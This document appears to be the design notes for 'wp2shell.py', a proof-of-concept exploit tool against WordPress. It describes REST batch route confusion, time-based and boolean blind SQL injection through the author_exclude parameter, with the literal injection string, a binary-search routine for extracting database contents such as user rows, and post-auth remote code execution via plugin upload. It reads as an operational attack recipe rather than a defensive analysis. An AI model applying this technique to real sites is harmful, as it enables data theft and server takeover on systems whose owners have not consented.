# PoC Tool — wp2shell.py

## Architecture

```
wp2shell.py
├── HTTPClient       — Raw HTTP (stdlib urllib, 0 dependencies)
├── BatchClient      — Double-confusion payload builder
├── BlindSQLi        — Boolean + time-based extraction engine
├── scan command     — Version → confusion → SQLi pipeline
├── read command     — Blind data extraction
└── shell command    — Post-auth RCE via plugin upload
```

## Detection Pipeline (scan)

### 1. Version Detection (passive, 2-3 GET)

- `/wp-json/` — REST API `generator` field
- Homepage — `<meta name="generator" content="WordPress X.Y.Z">`
- Check against known affected ranges

### 2. Route Confusion Marker (1 POST)

Sends 4-request batch:
```
[0] "///"           → parse_path_failed
[1] /wp/v2/posts    → block_cannot_read (POST not allowed on GET route)
[2] /block-renderer → rest_batch_not_allowed
[3] /batch/v1       → rest_batch_not_allowed (nested batch rejected)
```

All 3 marker codes present → index misalignment confirmed.

### 3. SQLi Confirmation (N×2 POST)

Paired SLEEP(0) vs SLEEP(N) probes through double-confusion chain. Median delta ≥ `max(0.75s, SLEEP*0.65)` → confirmed.

## Extraction Engine (read)

### Boolean-based Binary Search

ASCII range 32–126, ~7 requests per character (vs 95 linear):

```
For each position:
  1. Is ASCII(SUBSTRING(expr,pos,1)) > 0? → No → end of string
  2. lo=31, hi=126
  3. while lo+1 < hi:
       mid = (lo+hi)/2
       if ASCII(...) > mid → lo=mid else hi=mid
  4. character = chr(hi)
```

### Injection Syntax

```
author_exclude = 0) AND (<condition>)-- -
```

- `0)` closes `NOT IN (...)`
- `AND (<condition>)` appends attacker boolean
- `-- -` comments out trailing SQL

## Performance

| Operation | Requests |
|-----------|----------|
| Version detection | 2–3 |
| Route confusion check | 1 |
| SQLi confirm (3 rounds) | 6 |
| Extract 1 character | ~7 |
| Extract "8.0.46" | ~50 |
| Extract 1 user row | ~250 |

## Batch Endpoint Detection

Tool auto-detects working endpoint:
1. Try `POST /wp-json/batch/v1` → if 207, use it
2. Fallback `POST /index.php?rest_route=/batch/v1`
3. Use `-d` flag to see which endpoint is selected
